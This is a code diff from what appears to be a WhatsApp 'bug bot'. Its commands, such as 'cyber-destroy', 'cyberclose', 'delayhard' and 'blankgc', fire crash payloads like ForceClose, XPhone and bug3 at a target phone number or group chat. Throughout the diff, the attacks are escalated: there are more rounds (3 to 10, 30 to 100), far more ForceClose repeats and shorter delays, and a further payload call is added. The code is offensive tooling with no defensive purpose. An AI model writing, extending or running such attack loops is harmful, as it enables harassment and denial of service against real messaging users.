@@ -13952,47 +13952,28 @@ case 'cyber-destroy': {
     }
 
     let target = targetNumber + "@s.whatsapp.net";
-    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *3 Round Attack Launching...*`);
+    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *10 Round Attack Launching...*`);
 
     try {
-        // Round 1
         await CYBEReress();
-        await sleep(300);
-        await Combo(target);
-        await sleep(300);
-        await fcnew(target);
-        await sleep(300);
-        await XPhone(target);
-        await sleep(500);
-
-        // Round 2
-        await BayuOfficialHard(target);
-        await sleep(300);
-        await Combo(target);
-        await sleep(300);
-        await fcnew(target);
-        await sleep(300);
-        for (let i = 0; i < 10; i++) {
-            await ForceClose(target);
+        await sleep(150);
+        for (let round = 0; round < 10; round++) {
+            await Combo(target);
             await sleep(150);
-        }
-        await sleep(500);
-
-        // Round 3 — Final Kill
-        await Combo(target);
-        await sleep(300);
-        await fcnew(target);
-        await sleep(300);
-        await XPhone(target);
-        await sleep(300);
-        await BayuOfficialHard(target);
-        await sleep(300);
-        for (let i = 0; i < 10; i++) {
-            await ForceClose(target);
+            await fcnew(target);
             await sleep(150);
+            await XPhone(target);
+            await sleep(150);
+            await BayuOfficialHard(target);
+            await sleep(150);
+            for (let i = 0; i < 30; i++) {
+                await ForceClose(target);
+                await sleep(80);
+            }
+            await sleep(200);
         }
 
-        reply(`✅ *CYBER-DESTROY complete — 3 rounds done on ${targetNumber}*`);
+        reply(`✅ *CYBER-DESTROY complete — 10 rounds done on ${targetNumber}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'error'}*`);
     }
@@ -14019,26 +14000,26 @@ case "cyberinvis": {
 
     try {
         await CYBEReress();
-        await sleep(500);
-        await Combo(target);
-        await sleep(500);
-        await fcnew(target);
-        await sleep(500);
-        await Combo(target);
-        await sleep(500);
-        await fcnew(target);
-        await sleep(500);
-        await Combo(target);
-        await sleep(500);
-        await fcnew(target);
-        await sleep(500);
-        await XPhone(target);
-        await sleep(500);
-        await BayuOfficialHard(target);
-        await sleep(500);
-        await ForceClose(target);
-        await sleep(500);
-        await ForceClose(target);
+        await sleep(200);
+        for (let round = 0; round < 10; round++) {
+            await Combo(target);
+            await sleep(200);
+            await fcnew(target);
+            await sleep(200);
+            await Combo(target);
+            await sleep(200);
+            await fcnew(target);
+            await sleep(200);
+            await XPhone(target);
+            await sleep(200);
+            await BayuOfficialHard(target);
+            await sleep(200);
+            for (let j = 0; j < 10; j++) {
+                await ForceClose(target);
+                await sleep(100);
+            }
+            await sleep(200);
+        }
         reply(`✅ *Attack completed on ${pepec}*`);
     } catch(e) {
         reply(`⚠️ *Partial execution: ${e.message || 'Error'}*`);
@@ -14065,24 +14046,25 @@ case "delayhard": {
 
     try {
         await CYBEReress();
-        await sleep(300);
-        for (let round = 0; round < 3; round++) {
+        await sleep(150);
+        for (let round = 0; round < 10; round++) {
             await fcnew(target);
-            await sleep(300);
+            await sleep(150);
             await fcnew(target);
-            await sleep(300);
+            await sleep(150);
             await Combo(target);
-            await sleep(300);
+            await sleep(150);
             await Combo(target);
-            await sleep(300);
-        }
-        await XPhone(target);
-        await sleep(300);
-        await BayuOfficialHard(target);
-        await sleep(300);
-        for (let i = 0; i < 5; i++) {
-            await ForceClose(target);
-            await sleep(200);
+            await sleep(150);
+            await XPhone(target);
+            await sleep(150);
+            await BayuOfficialHard(target);
+            await sleep(150);
+            for (let i = 0; i < 15; i++) {
+                await ForceClose(target);
+                await sleep(80);
+            }
+            await sleep(150);
         }
         reply(`✅ *DELAYHARD complete on ${pepec}*`);
     } catch(e) {
@@ -14113,23 +14095,26 @@ case "cyberclose": {
 
     try {
         await CYBEReress();
-        await sleep(300);
-        await Combo(target);
-        await sleep(300);
-        for (let i = 0; i < 15; i++) {
-            await ForceClose(target);
+        await sleep(150);
+        for (let round = 0; round < 5; round++) {
+            await Combo(target);
             await sleep(150);
-        }
-        await sleep(500);
-        await fcnew(target);
-        await sleep(300);
-        await XPhone(target);
-        await sleep(300);
-        await BayuOfficialHard(target);
-        await sleep(300);
-        for (let i = 0; i < 5; i++) {
-            await ForceClose(target);
+            await fcnew(target);
             await sleep(150);
+            for (let i = 0; i < 50; i++) {
+                await ForceClose(target);
+                await sleep(80);
+            }
+            await sleep(150);
+            await XPhone(target);
+            await sleep(150);
+            await BayuOfficialHard(target);
+            await sleep(150);
+            for (let i = 0; i < 20; i++) {
+                await ForceClose(target);
+                await sleep(80);
+            }
+            await sleep(200);
         }
         reply(`✅ *Force close complete on ${pepec}*`);
     } catch(e) {
@@ -14153,13 +14138,15 @@ case 'blankgc': {
     reply(`💀 *GROUP DESTROY INITIATED*\n⚡ *Command:* ${command}\n🔥 *Hold tight...*`);
     
     try {
-        for (let i = 0; i < 30; i++) {
+        for (let i = 0; i < 100; i++) {
             await bug3(m.chat);
-            await sleep(1000);
+            await sleep(400);
             await bug3(m.chat);
-            await sleep(1000);
+            await sleep(400);
             await bug3(m.chat);
-            await sleep(800);
+            await sleep(300);
+            await VampireBugIns(m.chat);
+            await sleep(300);
         }
         reply(`✅ *Group destroyed — ${command} complete*`);
     } catch(e) {
